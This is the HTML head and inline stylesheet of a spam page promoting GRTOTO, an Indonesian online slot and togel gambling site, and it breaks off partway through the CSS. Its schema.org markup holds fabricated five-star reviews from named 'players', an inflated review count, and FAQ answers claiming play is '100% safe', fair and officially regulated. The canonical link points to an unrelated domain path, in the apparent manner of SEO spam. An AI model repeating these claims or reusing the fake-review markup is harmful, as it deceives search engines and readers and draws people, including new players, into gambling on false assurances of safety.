<!--

KAWAI ASLI-NYA C.E.O


KAMU MAU TEMPLATE C.E.O KAWAI?

IKUTI LANGKAH BERIKUT:

COPY PASTE KE BROWSER UNTUK LIHAT TUTORIAL: https://cdn.designfast.io/image/2026-02-27/4fc1f95d-e9bd-4c08-aa21-bee86805cb3c.jpeg

-->



<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <meta name="google-site-verification" content="ER7okvtqFiFQV-GRrIDBZTC3_Zy6bRI60z-NUHpr1fs" />
    <title>GRTOTO: Pusat Bandar Slot Togel Terpercaya Tempat Jackpot Spektakuler Tanpa Henti</title>
    <link rel="canonical" href="https://otiumpro.com/clientes/">
    <link rel="amphtml" href="https://c-e-o.b-cdn.net/c-e-o.html">
    <meta name="robots" content="index, follow">
    <meta name="googlebot" content="index, follow">
    <meta property="og:description"
        content="Pusat bandar slot online togel terpercaya yang menawarkan tempat bermain kelas elite dengan sistem modern, GRTOTO. Dengan peluang menang spektakuler tanpa henti, tujuan utama bagi yang ingin sensasi jackpot besar!">
    <meta property="og:type" content="website">
    <meta name="twitter:description"
        content="Pusat bandar slot online togel terpercaya yang menawarkan tempat bermain kelas elite dengan sistem modern, GRTOTO. Dengan peluang menang spektakuler tanpa henti, tujuan utama bagi yang ingin sensasi jackpot besar!">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description"
        content="Pusat bandar slot online togel terpercaya yang menawarkan tempat bermain kelas elite dengan sistem modern, GRTOTO. Dengan peluang menang spektakuler tanpa henti, tujuan utama bagi yang ingin sensasi jackpot besar!">
    <meta property="og:image" content="https://ik.imagekit.io/ljdihgltp/C.E.O.jpg">
    <meta property="og:title"
        content="GRTOTO: Pusat Bandar Slot Togel Terpercaya Tempat Jackpot Spektakuler Tanpa Henti">
    <meta name="twitter:image" content="https://ik.imagekit.io/ljdihgltp/C.E.O.jpg">
    <meta name="twitter:title"
        content="GRTOTO: Pusat Bandar Slot Togel Terpercaya Tempat Jackpot Spektakuler Tanpa Henti">
    <meta name="twitter:card" content="summary">
    <meta name="keywords"
        content="GRTOTO, Situs Toto, Toto Togel, Slot, Bandar Slot, Bandar Slot Togel">
    <link rel="apple-touch-icon" sizes="180x180"
        href="https://1v5pkxe0s3.ucarecd.net/e69e9174-cd02-495b-bf8a-f191b797f75e/iconceo.png">
    <link rel="icon" type="image/png" sizes="32x32"
        href="https://1v5pkxe0s3.ucarecd.net/e69e9174-cd02-495b-bf8a-f191b797f75e/iconceo.png">
    <link rel="icon" type="image/png" sizes="16x16"
        href="https://1v5pkxe0s3.ucarecd.net/e69e9174-cd02-495b-bf8a-f191b797f75e/iconceo.png">
    <link rel="icon" type="image/x-icon"
        href="https://1v5pkxe0s3.ucarecd.net/e69e9174-cd02-495b-bf8a-f191b797f75e/iconceo.png">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link rel="preconnect" href="https://otiumpro.com/clientes/">
    <link rel="preconnect" href="https://snap-assets.al-pc-id-p.cdn.gtflabs.io">
    <link rel="stylesheet" href="/assets/css/9XKimii_-1.3.14.css" crossorigin="">
    <link rel="stylesheet" href="/assets/css/GeCHvoZf-1.3.14.css" crossorigin="">
    <link rel="stylesheet" href="/assets/css/e4mgZbqd-1.3.14.css" crossorigin="">
    <link rel="stylesheet" href="/assets/css/BI3bMdQd-1.3.14.css" crossorigin="">
    <link rel="stylesheet" href="/assets/css/DVgmJYDc-1.3.14.css" crossorigin="">
    <link rel="stylesheet" crossorigin="" href="https://datascripmall.id/assets/css/88fJ46cw-1.3.14.css">
    <link rel="stylesheet" crossorigin="" href="https://datascripmall.id/assets/css/B_TyS8B--1.3.14.css">
    <link rel="stylesheet" crossorigin="" href="https://datascripmall.id/assets/css/CwKEHDeR-1.3.14.css">
    <link rel="stylesheet" crossorigin="" href="https://datascripmall.id/assets/css/Due-XyoM-1.3.14.css">
    <link rel="stylesheet" crossorigin="" href="https://datascripmall.id/assets/css/nZsc1J5C-1.3.14.css">
    <link rel="stylesheet" crossorigin="" href="https://datascripmall.id/assets/css/BiPJyPgx-1.3.14.css">
    <link rel="stylesheet" crossorigin="" href="https://datascripmall.id/assets/css/EjO2m45T-1.3.14.css">
    <link rel="stylesheet" crossorigin="" href="https://datascripmall.id/assets/css/wvx_AdHB-1.3.14.css">
    <link rel="stylesheet" crossorigin="" href="https://datascripmall.id/assets/css/BxKmyOBC-1.3.14.css">
    <link rel="stylesheet" crossorigin="" href="https://datascripmall.id/assets/css/DWxnsnBD-1.3.14.css">
    <link rel="stylesheet" crossorigin="" href="https://datascripmall.id/assets/css/BMTYcoEj-1.3.14.css">
    <link rel="stylesheet" crossorigin="" href="https://datascripmall.id/assets/css/DcrrNuSx-1.3.14.css">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/CnXC_UnF-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/CTl4qRzK-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/B6iWWwVC-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/DwO9n16d-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/dzlqtXJX-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/BIZmkC01-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/hpVwNmHZ-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/D05WYp-h-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/Cb7p2A_s-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/C4koSMWK-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/PAkorQR--1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/BWF_zWT_-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/Csshp3gG-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/DMkZUoYr-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/BoVIbzMK-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/DGIB7ZCf-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/IGXSU7q4-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/Chsgpbt8-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/CLUvIb7i-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/Dgj5V3ga-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/C5FlEsAM-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/DpC4B6k3-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/DERoChRe-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/DoRx9_CS-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/BRYjiSht-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/CUHDGPUT-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/CUkQCeJU-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/Dd5672A4-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/Ce9_fslE-1.3.14.js">
    <link rel="modulepreload" as="script" crossorigin="" href="https://datascripmall.id/assets/bWL1-RH5-1.3.14.js">
    <script type="module" src="/assets/D7bKd8kK-1.3.14.js" crossorigin=""></script>

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Product",
  "url": "https://otiumpro.com/clientes/",
  "name": "GRTOTO: Pusat Bandar Slot Togel Terpercaya Tempat Jackpot Spektakuler Tanpa Henti",
  "sku": "GRTOTO",
  "description": "Pusat bandar slot online togel terpercaya yang menawarkan tempat bermain kelas elite dengan sistem modern, GRTOTO. Dengan peluang menang spektakuler tanpa henti, tujuan utama bagi yang ingin sensasi jackpot besar!",
  "image": [
    {
      "@type": "ImageObject",
      "url": "https://ik.imagekit.io/ljdihgltp/C.E.O.jpg",
      "thumbnailUrl": "https://ik.imagekit.io/ljdihgltp/C.E.O.jpg"
    }
  ],
  "category": "SITUS TOTO ONLINE",
  "brand": {
    "@type": "Brand",
    "name": "GRTOTO",
    "logo": {
      "@type": "ImageObject",
      "url": "https://cdn.jsdelivr.net/gh/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design@d4420458fb1e9c34e6fb6a576257df308a634ed8/uploads/2026-02-27T07-12-47-585Z-g25mfkdn9.png"
    }
  },
  "aggregateRating": {
    "@type": "AggregateRating",
    "ratingValue": 5,
    "reviewCount": 100007
  },
  "offers": {
    "@type": "AggregateOffer",
    "offerCount": 100007,
    "lowPrice": 5000,
    "highPrice": 50000,
    "priceCurrency": "IDR",
    "availability": "https://schema.org/InStock",
    "shippingDetails": {
      "@type": "OfferShippingDetails",
      "shippingOrigin": {
        "@type": "DefinedRegion",
        "addressCountry": "ID"
      }
    }
  },
  "review": [
    {
      "@type": "Review",
      "author": {
        "@type": "Person",
        "name": "Budi, Jakarta"
      },
      "datePublished": "2026-01-10",
      "reviewBody": "GRTOTO benar-benar terbukti sebagai situs toto online Top 1. Regulasi resminya membuat saya merasa aman bermain toto togel, ditambah link selalu aktif dan mudah diakses.",
      "reviewRating": {
        "@type": "Rating",
        "ratingValue": 5,
        "bestRating": 5,
        "worstRating": 1
      }
    },
    {
      "@type": "Review",
      "author": {
        "@type": "Person",
        "name": "Siti, Surabaya"
      },
      "datePublished": "2026-01-03",
      "reviewBody": "Saya sudah mencoba banyak situs toto, tapi hanya GRTOTO yang konsisten soal keamanan dan update pasaran toto togel. Link yang disediakan juga termasuk paling dicari.",
      "reviewRating": {
        "@type": "Rating",
        "ratingValue": 5,
        "bestRating": 5,
        "worstRating": 1
      }
    },
    {
      "@type": "Review",
      "author": {
        "@type": "Person",
        "name": "Agus, Medan"
      },
      "datePublished": "2025-12-25",
      "reviewBody": "Bermain di GRTOTO sangat nyaman karena regulasinya jelas dan sistemnya fair play. Sebagai situs toto terpercaya, GRTOTO unggul dalam layanan toto togel.",
      "reviewRating": {
        "@type": "Rating",
        "ratingValue": 5,
        "bestRating": 5,
        "worstRating": 1
      }
    },
    {
      "@type": "Review",
      "author": {
        "@type": "Person",
        "name": "Rizky, Bandung"
      },
      "datePublished": "2025-12-13",
      "reviewBody": "GRTOTO layak disebut situs toto online Top 1. Akses cepat, link toto togel paling dicari, serta pelayanan profesional membuat saya betah bermain.",
      "reviewRating": {
        "@type": "Rating",
        "ratingValue": 5,
        "bestRating": 5,
        "worstRating": 1
      }
    },
    {
      "@type": "Review",
      "author": {
        "@type": "Person",
        "name": "Dewi, Makassar"
      },
      "datePublished": "2025-12-01",
      "reviewBody": "Sejak mengenal GRTOTO, saya tidak lagi ragu memilih situs toto. Semua pasaran toto togel lengkap, aman, dan didukung regulasi resmi.",
      "reviewRating": {
        "@type": "Rating",
        "ratingValue": 5,
        "bestRating": 5,
        "worstRating": 1
      }
    }
  ]
}
</script>

    <script type="application/ld+json">
        {
  "@context": "https://schema.org",
  "@type": "VideoObject",
  "name": "GRTOTO",
  "description": "Pusat bandar slot online togel terpercaya yang menawarkan tempat bermain kelas elite dengan sistem modern, GRTOTO. Dengan peluang menang spektakuler tanpa henti, tujuan utama bagi yang ingin sensasi jackpot besar!",
  "thumbnailUrl": [
    "https://ik.imagekit.io/ljdihgltp/C.E.O.jpg",
    "https://ik.imagekit.io/ljdihgltp/C.E.O.jpg"
  ],
  "uploadDate": "2025-10-27T15:05:10-04:00",
  "contentUrl": "https://ik.imagekit.io/ljdihgltp/C.E.O.jpg"
}
    </script>

    <script type="application/ld+json" data-rh="true">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position": 1,
      "item": {
        "@id": "https://otiumpro.com/clientes/",
        "name": "GRTOTO"
      }
    },
    {
      "@type": "ListItem",
      "position": 2,
      "item": {
        "@id": "https://otiumpro.com/clientes/",
        "name": "SITUS TOTO"
      }
    },
    {
      "@type": "ListItem",
      "position": 3,
      "item": {
        "@id": "https://otiumpro.com/clientes/",
        "name": "TOTO TOGEL"
      }
    },
    {
      "@type": "ListItem",
      "position": 4,
      "item": {
        "@id": "https://otiumpro.com/clientes/",
        "name": "TOTO"
      }
    },
    {
      "@type": "ListItem",
      "position": 5,
      "item": {
        "@id": "https://otiumpro.com/clientes/",
        "name": "TOGEL"
      }
    },
    {
      "@type": "ListItem",
      "position": 6,
      "item": {
        "@id": "https://otiumpro.com/clientes/",
        "name": "TOTO ONLINE"
      }
    },
    {
      "@type": "ListItem",
      "position": 7,
      "item": {
        "@id": "https://otiumpro.com/clientes/",
        "name": "TOGEL ONLINE"
      }
    },
    {
      "@type": "ListItem",
      "position": 8,
      "item": {
        "@id": "https://otiumpro.com/clientes/",
        "name": "GRTOTO: Pusat Bandar Slot Togel Terpercaya Tempat Jackpot Spektakuler Tanpa Henti"
      }
    }
  ]
}
</script>
    <script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "name": "FAQ RESMI SEPUTAR PEMAIN GRTOTO",
  "mainEntity": [
    {
      "@type": "Question",
      "name": "Mengapa GRTOTO selalu jadi incaran pemain slot dan togel toto 4D?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Tentu saja karena, GRTOTO terkenal sebagai platform bandar slot gacor jackpot tanpa henti & togel toto 4D pasaran lengkap terpercaya. Memiliki regulasi resmi, reputasi baik, serta menyediakan link alternatif cepat dan stabil untuk semua pemain."
      }
    },
    {
      "@type": "Question",
      "name": "Bagaimana dengan sistem permainan di GRTOTO, amankah?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Ya, 100% pasti aman GRTOTO memiliki sistem elite modern dan fair play hingga pemain mampu memainkan slot online maupun togel dengan nyaman di platform terpercaya ini."
      }
    },
    {
      "@type": "Question",
      "name": "Pasaran slot dan togel toto apa saja yang tersedia di GR TOTO?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "GR TOTO menghadirkan pasaran slot online dan togel paling populer dengan result cepat serta sangat akurat. Menjadikan GR selalu jadi pilihan pertama bagi para pengguna hari ini, terutama slot Pragmatic yang selalu memberi jackpot spektakuler."
      }
    },
    {
      "@type": "Question",
      "name": "Tersediakah di GRTOTO untuk layanan bantuan?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Layanan bantuan handal akan selalu siap membantu pemain kapan pun, menjadikan GRTOTO sangat unggul sebagai platform terbaik 2026 hari ini."
      }
    },
    {
      "@type": "Question",
      "name": "Cocok kah GRTOTO untuk para pemain baru?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Sangat-sangat-sangat cocok, pemain baru dapat mencoba memilih GRTOTO sebab konsistensi, regulasi, stabilitas link, maupun kenyamanan bermain."
      }
    }
  ]
}
</script>

    <script type="application/ld+json">
        {
  "@context": "https://schema.org",
  "@graph": [
    {
      "@type": "Organization",
      "@id": "https://otiumpro.com/clientes/#org",
      "name": "GRTOTO",
      "url": "https://otiumpro.com/clientes/",
      "logo": "https://cdn.jsdelivr.net/gh/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design@d4420458fb1e9c34e6fb6a576257df308a634ed8/uploads/2026-02-27T07-12-47-585Z-g25mfkdn9.png"
    },
    {
      "@type": "WebSite",
      "@id": "https://otiumpro.com/clientes/#website",
      "url": "https://otiumpro.com/clientes/",
      "name": "GRTOTO",
      "publisher": { "@id": "https://otiumpro.com/clientes/#org" },
      "inLanguage": "id-ID",
      "potentialAction": {
        "@type": "SearchAction",
        "target": "https://otiumpro.com/clientes/?s={search_term_string}",
        "query-input": "required name=search_term_string"
      }
    },
    {
      "@type": "SoftwareApplication",
      "@id": "https://otiumpro.com/clientes/#app",
      "name": "GRTOTO",
      "applicationCategory": "ShopApplication",
      "operatingSystem": "Android, iOS, Windows",
      "offers": { "@type": "Offer", "price": "0", "priceCurrency": "IDR" },
      "aggregateRating": { "@type": "AggregateRating", "ratingValue": 5.0, "ratingCount": 100.007 }
    }
  ]
}
    </script>
    <style>
        .grecaptcha-badge {
            visibility: hidden !important;
        }
    </style>
    <style>
        *,
        ::backdrop,
        :after,
        :before {
            --tw-border-spacing-x: 0;
            --tw-border-spacing-y: 0;
            --tw-translate-x: 0;
            --tw-translate-y: 0;
            --tw-rotate: 0;
            --tw-skew-x: 0;
            --tw-skew-y: 0;
            --tw-scale-x: 1;
            --tw-scale-y: 1;
            --tw-pan-x: ;
            --tw-pan-y: ;
            --tw-pinch-zoom: ;
            --tw-scroll-snap-strictness: proximity;
            --tw-gradient-from-position: ;
            --tw-gradient-via-position: ;
            --tw-gradient-to-position: ;
            --tw-ordinal: ;
            --tw-slashed-zero: ;
            --tw-numeric-figure: ;
            --tw-numeric-spacing: ;
            --tw-numeric-fraction: ;
            --tw-ring-inset: ;
            --tw-ring-offset-width: 0px;
            --tw-ring-offset-color: #fff;
            --tw-ring-color: #3b82f680;
            --tw-ring-offset-shadow: 0 0 #0000;
            --tw-ring-shadow: 0 0 #0000;
            --tw-shadow: 0 0 #0000;
            --tw-shadow-colored: 0 0 #0000;
            --tw-blur: ;
            --tw-brightness: ;
            --tw-contrast: ;
            --tw-grayscale: ;
            --tw-hue-rotate: ;
            --tw-invert: ;
            --tw-saturate: ;
            --tw-sepia: ;
            --tw-drop-shadow: ;
            --tw-backdrop-blur: ;
            --tw-backdrop-brightness: ;
            --tw-backdrop-contrast: ;
            --tw-backdrop-grayscale: ;
            --tw-backdrop-hue-rotate: ;
            --tw-backdrop-invert: ;
            --tw-backdrop-opacity: ;
            --tw-backdrop-saturate: ;
            --tw-backdrop-sepia: ;
            --tw-contain-size: ;
            --tw-contain-layout: ;
            --tw-contain-paint: ;
            --tw-contain-style:
        }

        /*! tailwindcss v3.4.17 | MIT License | https://tailwindcss.com*/
        *,
        :after,
        :before {
            border: 0 solid #e5e7eb;
            box-sizing: border-box
        }

        :after,
        :before {
            --tw-content: ""
        }

        :host,
        html {
            line-height: 1.5;
            -webkit-text-size-adjust: 100%;
            font-family: ui-sans-serif, system-ui, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;
            font-feature-settings: normal;
            font-variation-settings: normal;
            -moz-tab-size: 4;
            tab-size: 4;
            -webkit-tap-highlight-color: transparent
        }

        body {
            line-height: inherit;
            margin: 0
        }

        hr {
            border-top-width: 1px;
            color: inherit;
            height: 0
        }

        abbr:where([title]) {
            -webkit-text-decoration: underline dotted;
            text-decoration: underline dotted
        }

        h1,
        h2,
        h3,
        h4,
        h5,
        h6 {
            font-size: inherit;
            font-weight: inherit
        }

        a {
            color: inherit;
            text-decoration: inherit
        }

        b,
        strong {
            font-weight: bolder
        }

        code,
        kbd,
        pre,
        samp {
            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, Liberation Mono, Courier New, monospace;
            font-feature-settings: normal;
            font-size: 1em;
            font-variation-settings: normal
        }

        small {
            font-size: 80%
        }

        sub,
        sup {
            font-size: 75%;
            line-height: 0;
            position: relative;
            vertical-align: initial
        }

        sub {
            bottom: -.25em
        }

        sup {
            top: -.5em
        }

        table {
            border-collapse: collapse;
            border-color: inherit;
            text-indent: 0
        }

        button,
        input,
        optgroup,
        select,
        textarea {
            color: inherit;
            font-family: inherit;
            font-feature-settings: inherit;
            font-size: 100%;
            font-variation-settings: inherit;
            font-weight: inherit;
            letter-spacing: inherit;
            line-height: inherit;
            margin: 0;
            padding: 0
        }

        button,
        select {
            text-transform: none
        }

        button,
        input:where([type=button]),
        input:where([type=reset]),
        input:where([type=submit]) {
            appearance: button;
            background-color: initial;
            background-image: none
        }

        :-moz-focusring {
            outline: auto
        }

        :-moz-ui-invalid {
            box-shadow: none
        }

        progress {
            vertical-align: initial
        }

        ::-webkit-inner-spin-button,
        ::-webkit-outer-spin-button {
            height: auto
        }

        [type=search] {
            appearance: textfield;
            outline-offset: -2px
        }

        ::-webkit-search-decoration {
            -webkit-appearance: none
        }

        ::-webkit-file-upload-button {
            -webkit-appearance: button;
            font: inherit
        }

        summary {
            display: list-item
        }

        blockquote,
        dd,
        dl,
        figure,
        h1,
        h2,
        h3,
        h4,
        h5,
        h6,
        hr,
        p,
        pre {
            margin: 0
        }

        fieldset {
            margin: 0
        }

        fieldset,
        legend {
            padding: 0
        }

        menu,
        ol,
        ul {
            list-style: none;
            margin: 0;
            padding: 0
        }

        dialog {
            padding: 0
        }

        textarea {
            resize: vertical
        }

        input::placeholder,
        textarea::placeholder {
            color: #9ca3af;
            opacity: 1
        }

        [role=button],
        button {
            cursor: pointer
        }

        :disabled {
            cursor: default
        }

        audio,
        canvas,
        embed,
        iframe,
        img,
        object,
        svg,
        video {
            vertical-align: middle
        }

        img,
        video {
            height: auto;
            max-width: 100%
        }

        [hidden]:where(:not([hidden=until-found])) {
            display: none
        }

        [multiple],
        [type=date],
        [type=datetime-local],
        [type=email],
        [type=month],
        [type=number],
        [type=password],
        [type=search],
        [type=tel],
        [type=text],
        [type=time],
        [type=url],
        [type=week],
        input:where(:not([type])),
        select,
        textarea {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            background-color: #fff;
            border-color: #6b7280;
            border-radius: 0;
            border-width: 1px;
            font-size: 1rem;
            line-height: 1.5rem;
            padding: .5rem .75rem;
            --tw-shadow: 0 0 #0000
        }

        [multiple]:focus,
        [type=date]:focus,
        [type=datetime-local]:focus,
        [type=email]:focus,
        [type=month]:focus,
        [type=number]:focus,
        [type=password]:focus,
        [type=search]:focus,
        [type=tel]:focus,
        [type=text]:focus,
        [type=time]:focus,
        [type=url]:focus,
        [type=week]:focus,
        input:where(:not([type])):focus,
        select:focus,
        textarea:focus {
            outline: 2px solid #0000;
            outline-offset: 2px;
            --tw-ring-inset: var(--tw-empty, );
            --tw-ring-offset-width: 0px;
            --tw-ring-offset-color: #fff;
            --tw-ring-color: #2563eb;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            border-color: #2563eb;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
        }

        input::placeholder,
        textarea::placeholder {
            color: #6b7280;
            opacity: 1
        }

        ::-webkit-datetime-edit-fields-wrapper {
            padding: 0
        }

        ::-webkit-date-and-time-value {
            min-height: 1.5em;
            text-align: inherit
        }

        ::-webkit-datetime-edit {
            display: inline-flex
        }

        ::-webkit-datetime-edit,
        ::-webkit-datetime-edit-day-field,
        ::-webkit-datetime-edit-hour-field,
        ::-webkit-datetime-edit-meridiem-field,
        ::-webkit-datetime-edit-millisecond-field,
        ::-webkit-datetime-edit-minute-field,
        ::-webkit-datetime-edit-month-field,
        ::-webkit-datetime-edit-second-field,
        ::-webkit-datetime-edit-year-field {
            padding-bottom: 0;
            padding-top: 0
        }

        select {
            background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3E%3Cpath stroke='%236b7280' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3E%3C/svg%3E");
            background-position: right .5rem center;
            background-repeat: no-repeat;
            background-size: 1.5em 1.5em;
            padding-right: 2.5rem;
            -webkit-print-color-adjust: exact;
            print-color-adjust: exact
        }

        [multiple],
        [size]:where(select:not([size="1"])) {
            background-image: none;
            background-position: 0 0;
            background-repeat: unset;
            background-size: initial;
            padding-right: .75rem;
            -webkit-print-color-adjust: unset;
            print-color-adjust: unset
        }

        [type=checkbox],
        [type=radio] {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            background-color: #fff;
            background-origin: border-box;
            border-color: #6b7280;
            border-width: 1px;
            color: #2563eb;
            display: inline-block;
            flex-shrink: 0;
            height: 1rem;
            padding: 0;
            -webkit-print-color-adjust: exact;
            print-color-adjust: exact;
            -webkit-user-select: none;
            user-select: none;
            vertical-align: middle;
            width: 1rem;
            --tw-shadow: 0 0 #0000
        }

        [type=checkbox] {
            border-radius: 0
        }

        [type=radio] {
            border-radius: 100%
        }

        [type=checkbox]:focus,
        [type=radio]:focus {
            outline: 2px solid #0000;
            outline-offset: 2px;
            --tw-ring-inset: var(--tw-empty, );
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: #fff;
            --tw-ring-color: #2563eb;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
        }

        [type=checkbox]:checked,
        [type=radio]:checked {
            background-color: currentColor;
            background-position: 50%;
            background-repeat: no-repeat;
            background-size: 100% 100%;
            border-color: #0000
        }

        [type=checkbox]:checked {
            background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%23fff' viewBox='0 0 16 16'%3E%3Cpath d='M12.207 4.793a1 1 0 0 1 0 1.414l-5 5a1 1 0 0 1-1.414 0l-2-2a1 1 0 0 1 1.414-1.414L6.5 9.086l4.293-4.293a1 1 0 0 1 1.414 0'/%3E%3C/svg%3E")
        }

        @media (forced-colors:active) {
            [type=checkbox]:checked {
                -webkit-appearance: auto;
                -moz-appearance: auto;
                appearance: auto
            }
        }

        [type=radio]:checked {
            background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%23fff' viewBox='0 0 16 16'%3E%3Ccircle cx='8' cy='8' r='3'/%3E%3C/svg%3E")
        }

        @media (forced-colors:active) {
            [type=radio]:checked {
                -webkit-appearance: auto;
                -moz-appearance: auto;
                appearance: auto
            }
        }

        [type=checkbox]:checked:focus,
        [type=checkbox]:checked:hover,
        [type=checkbox]:indeterminate,
        [type=radio]:checked:focus,
        [type=radio]:checked:hover {
            background-color: currentColor;
            border-color: #0000
        }

        [type=checkbox]:indeterminate {
            background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 16 16'%3E%3Cpath stroke='%23fff' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M4 8h8'/%3E%3C/svg%3E");
            background-position: 50%;
            background-repeat: no-repeat;
            background-size: 100% 100%
        }

        @media (forced-colors:active) {
            [type=checkbox]:indeterminate {
                -webkit-appearance: auto;
                -moz-appearance: auto;
                appearance: auto
            }
        }

        [type=checkbox]:indeterminate:focus,
        [type=checkbox]:indeterminate:hover {
            background-color: currentColor;
            border-color: #0000
        }

        [type=file] {
            background: unset;
            border-color: inherit;
            border-radius: 0;
            border-width: 0;
            font-size: unset;
            line-height: inherit;
            padding: 0
        }

        [type=file]:focus {
            outline: 1px solid ButtonText;
            outline: 1px auto -webkit-focus-ring-color
        }

        .container {
            width: 100%
        }

        @media (min-width:640px) {
            .container {
                max-width: 640px
            }
        }

        @media (min-width:768px) {
            .container {
                max-width: 768px
            }
        }

        @media (min-width:1024px) {
            .container {
                max-width: 1024px
            }
        }

        @media (min-width:1280px) {
            .container {
                max-width: 1280px
            }
        }

        @media (min-width:1440px) {
            .container {
                max-width: 1440px
            }
        }

        @media (min-width:1920px) {
            .container {
                max-width: 1920px
            }
        }

        .form-input,
        .form-multiselect,
        .form-select,
        .form-textarea {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            background-color: #fff;
            border-color: #6b7280;
            border-radius: 0;
            border-width: 1px;
            font-size: 1rem;
            line-height: 1.5rem;
            padding: .5rem .75rem;
            --tw-shadow: 0 0 #0000
        }

        .form-input:focus,
        .form-multiselect:focus,
        .form-select:focus,
        .form-textarea:focus {
            outline: 2px solid #0000;
            outline-offset: 2px;
            --tw-ring-inset: var(--tw-empty, );
            --tw-ring-offset-width: 0px;
            --tw-ring-offset-color: #fff;
            --tw-ring-color: #2563eb;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            border-color: #2563eb;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
        }

        .form-select {
            background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3E%3Cpath stroke='%236b7280' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3E%3C/svg%3E");
            background-position: right .5rem center;
            background-repeat: no-repeat;
            background-size: 1.5em 1.5em;
            padding-right: 2.5rem;
            -webkit-print-color-adjust: exact;
            print-color-adjust: exact
        }
